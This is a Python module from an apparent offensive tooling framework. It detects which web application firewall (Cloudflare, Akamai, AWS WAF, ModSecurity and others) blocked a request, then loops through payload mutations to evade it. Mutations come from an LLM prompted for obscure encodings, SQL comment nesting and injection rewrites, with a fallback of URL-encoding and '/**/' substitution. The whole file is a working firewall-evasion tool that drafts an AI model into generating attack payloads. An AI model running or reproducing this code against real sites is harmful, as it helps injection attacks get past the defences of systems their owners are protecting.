import logging
import asyncio
import random
import re
from typing import Dict, Any, Optional, Tuple
from aura.core.brain import AuraBrain

logger = logging.getLogger("aura")

class GeneticWAFBypass:
    """
    Phase 2 (Opportunity 1): Real-Time LLM Payload Mutation.
    The 'Genetic AI' feedback loop for autonomous WAF evasion.
    """

    WAF_SIGNATURES = {
        "Cloudflare": [r"cf-ray", r"cloudflare", r"Cloudflare Ray ID"],
        "Akamai": [r"x-akamai", r"akamai-ghost", r"An error occurred while processing your request"],
        "AWS WAF": [r"x-amzn-RequestId", r"awswaf"],
        "ModSecurity": [r"mod_security", r"Not Acceptable"],
        "Imperva": [r"X-IWS-ID", r"imperva"],
        "FortiWeb": [r"fortiwafsid"]
    }

    def __init__(self, brain: AuraBrain, session):
        self.brain = brain
        self.session = session
        self.max_retries = 3
        self.mutation_history = {} # Track successful mutations per WAF type

    def detect_waf(self, status: int, headers: dict, body: str) -> Optional[str]:
        """Identifies which WAF blocked the request."""
        body_str = str(body).lower()
        header_str = str(headers).lower()

        for waf, sigs in self.WAF_SIGNATURES.items():
            for sig in sigs:
                if re.search(sig.lower(), body_str) or re.search(sig.lower(), header_str):
                    return waf

        if status in [403, 401, 406]:
            return "Generic WAF / Security Filter"

        return None

    async def bypass_and_retry(self, method: str, url: str, original_payload: str, **kwargs) -> Tuple[Any, bool]:
        """
        The Core Feedback Loop: Intercepts blocks, mutates, and retries.
        Returns (Response, WasBypassed)
        """
        # 1. Execute initial request
        response = await self.session.request(method, url, **kwargs)

        # 2. Check for WAF blockage
        waf_type = self.detect_waf(response.status_code, response.headers, response.text)
        if not waf_type:
            return response, False

        logger.warning(f"[🧬 GENETIC] WAF Block Detected ({waf_type}) on {url}. Initiating AI Mutation Loop...")

        current_payload = original_payload
        for attempt in range(1, self.max_retries + 1):
            # 3. Request Singularity Mutation from AuraBrain
            mutated_payload = await self._get_ai_mutation(
                original_payload=current_payload,
                waf_type=waf_type,
                response_code=response.status_code,
                response_body=response.text[:1000],
                attempt=attempt
            )

            if not mutated_payload or mutated_payload == current_payload:
                # Fallback to deterministic polymorphism if AI fails
                mutated_payload = self._deterministic_fallback(current_payload)

            # 4. Update kwargs with the new mutated payload
            # (Logic here depends on how the payload was originally passed: params, json, or data)
            new_kwargs = self._inject_payload(kwargs, mutated_payload)

            # 5. Retry request
            logger.info(f"[🧬 GENETIC] Mutation Attempt {attempt}: Trying payload -> {mutated_payload}")
            response = await self.session.request(method, url, **new_kwargs)

            # 6. Check if bypass was successful
            if not self.detect_waf(response.status_code, response.headers, response.text) and response.status_code < 400:
                logger.info(f"[🧬 GENETIC] SUCCESS! WAF Bypassed on attempt {attempt} for {url}")
                return response, True

            current_payload = mutated_payload
            await asyncio.sleep(random.uniform(1.0, 2.0)) # Avoid rate limits during retries

        logger.error(f"[🧬 GENETIC] FAILED to bypass {waf_type} after {self.max_retries} attempts.")
        return response, False

    async def _get_ai_mutation(self, original_payload: str, waf_type: str, response_code: int, response_body: str, attempt: int) -> str:
        """Consults the AuraBrain for a high-entropy mutation."""
        prompt = (
            f"CRITICAL: Your security payload was BLOCKED by {waf_type}.\n"
            f"Blocked Payload: {original_payload}\n"
            f"HTTP Status: {response_code}\n"
            f"Mutation Attempt: {attempt}\n"
            f"Response Snippet: {response_body}\n\n"
            "Task: Generate a technical bypass payload for this specific WAF.\n"
            "Use obscure encodings (double URL, unicode), whitespace variations (TAB, Newline), "
            "comment nesting (SQL), or non-standard syntax (e.g. `1 OR 1--` -> `1||1#`).\n"
            "Respond ONLY with the raw mutated payload string."
        )
        try:
            return await asyncio.to_thread(self.brain.query, prompt)
        except Exception:
            return ""

    def _inject_payload(self, kwargs: dict, payload: str) -> dict:
        """Deeply injects the mutated payload back into the request arguments."""
        new_kwargs = kwargs.copy()
        # Search and replace in params, json, or data
        for key in ["params", "json", "data"]:
            if key in new_kwargs and isinstance(new_kwargs[key], dict):
                for p_key, p_val in new_kwargs[key].items():
                    # We assume the payload is part of the value
                    if isinstance(p_val, str):
                        # Simple replace logic - might need more complex regex for real targets
                        new_kwargs[key][p_key] = payload
        return new_kwargs

    def _deterministic_fallback(self, payload: str) -> str:
        """Standard Red Team polymorphism when AI is offline."""
        import urllib.parse
        strategies = [
            lambda p: urllib.parse.quote(p),
            lambda p: p.replace(" ", "/**/"),
            lambda p: p.replace("'", "\\'")
        ]
        return random.choice(strategies)(payload)
